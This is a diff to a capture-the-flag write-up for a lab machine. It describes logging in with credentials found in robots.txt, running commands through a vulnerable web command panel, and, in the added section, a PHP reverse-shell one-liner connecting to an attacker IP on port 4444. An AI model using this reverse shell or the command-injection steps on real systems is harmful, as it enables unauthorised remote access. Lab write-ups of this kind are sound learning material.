@@ -37,5 +37,19 @@ dirsearch:
 - Found password in 10.10.191.16/robots.txt - Wubbalubbadubdub
 - Navigate to /login.php and used username R1ckRul3s and password Wubbalubbadubdub to log in.
 
-  ## Exploit
+## Exploit
+Command Panel is vulnerable and allowing to use commands to get information. I used "ls -a" to list all files including hidden files and found Sup3rS3cretPickl3Ingred.txt. I was able to get the first ingredient by running - grep . -R
+
+## Reverse Shell
+Executed PHP reverse shell and gained access: 
+```
+php -r '$sock=fsockopen("10.6.41.41",4444);exec("/bin/sh -i <&3 >&3 2>&3");’
+```
+Cheatsheet - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+
+
+
+
 
